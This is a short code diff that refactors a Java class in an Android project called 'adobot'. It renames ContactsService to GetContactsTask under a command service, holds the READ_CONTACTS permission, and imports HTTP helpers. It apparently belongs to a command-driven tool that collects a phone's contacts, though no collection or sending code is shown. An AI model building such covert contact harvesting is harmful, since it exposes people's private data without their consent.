@@ -1,30 +1,31 @@
-package com.android.adobot;
+package com.android.adobot.tasks;
 
 import android.Manifest;
 import android.content.ContentResolver;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.os.Build;
 import android.provider.ContactsContract;
-import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
+import com.android.adobot.CommandService;
+import com.android.adobot.CommonParams;
+
 import java.util.HashMap;
 
-import http.Http;
-import http.HttpRequest;
+import com.android.adobot.http.Http;
+import com.android.adobot.http.HttpRequest;
 
 /**
  * Created by adones on 2/24/17.
  */
 
-public class ContactsService extends BaseService {
-    private static final String TAG = "ContactsService";
+public class GetContactsTask extends BaseTask {
+    private static final String TAG = "GetContactsTask";
     private CommonParams commonParams;
     private final String[] pers = {Manifest.permission.READ_CONTACTS};
 
-    public ContactsService(Client c) {
+    public GetContactsTask(CommandService c) {
         setContext(c);
         this.commonParams = new CommonParams(c);
     }
